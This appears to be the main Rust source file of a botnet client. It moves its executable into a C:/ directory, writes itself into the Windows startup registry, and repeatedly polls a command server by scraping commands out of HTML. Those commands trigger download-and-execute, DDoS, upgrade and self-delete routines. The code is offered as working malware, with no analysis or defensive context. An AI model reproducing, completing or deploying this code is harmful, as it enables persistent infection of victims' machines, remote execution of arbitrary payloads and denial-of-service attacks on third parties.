extern crate reqwest;
extern crate regex;
use regex::Regex;
use std::thread;
use std::time;
mod config;
mod setuper;
mod web;
mod cmd;
mod funcs;

fn execute(_cmd: cmd::Command) {
    match &*_cmd.cmd_type.to_string() {
        "download_exec" => funcs::download_exec(Box::leak(_cmd.cmd_content.into_boxed_str())),
        "ddos" => funcs::ddos(_cmd.cmd_content),
        "upgrade" => funcs::upgrade(_cmd.cmd_content),
        "exit" => funcs::exit(),
        "delete_botnet" => funcs::delete_botnet(),
        "stop" => funcs::nothing(),
        "no_internet" => funcs::no_inet(), // WTF?
        _ => funcs::nothing(),
    }
}

fn main() {
    // std::env::set_var("RUST_BACKTRACE", "1");
    if !setuper::check_run_from() {
        // Move botnet exe file to C:/[dir_name]
        setuper::set_to_true_dir();
    }

    // Add botnet to startup register
    setuper::add_to_startup_reg();

    let mut last_cmd = String::new();

    loop {
        let html: String = web::get_html(config::SERVER).unwrap();
        let re = Regex::new(r"<p>(.*)</p></article>").unwrap();
        let content: &str = match re.captures(&html) {
            Some(res) => res.get(0).unwrap().as_str(),
            None => {
                thread::sleep(time::Duration::from_secs(config::DELAY));
                continue;
            },
        };
        // Get command form parsed trash string
        let _cmd = cmd::cmd(&content[3..content.len()-14]);

        if last_cmd == _cmd.cmd_type {
            thread::sleep(time::Duration::from_secs(config::DELAY));
            continue;
        }

        last_cmd = _cmd.cmd_type.clone();
        execute(_cmd);

        thread::sleep(time::Duration::from_secs(config::DELAY));
    }
}
